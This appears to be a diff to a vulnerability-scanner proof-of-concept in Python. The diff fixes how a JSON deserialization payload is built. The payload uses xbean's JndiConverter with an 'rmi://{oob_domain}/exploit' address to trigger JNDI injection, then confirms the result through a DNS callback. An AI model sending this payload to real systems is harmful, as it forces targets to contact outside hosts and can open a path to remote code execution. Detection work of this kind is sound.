@@ -42,12 +42,12 @@ def poc(url):
 
         path = """/"""
         method = "POST"
-        data = """{
-   "@type":"org.apache.xbean.propertyeditor.JndiConverter",
-   "AsText":"rmi://{oob_domain}/exploit"
-}""".format(oob_domain=oob_domain)
+        data = {
+            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
+            "AsText":"rmi://{oob_domain}/exploit".format(oob_domain=oob_domain)
+        }
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
             result["success"] = True
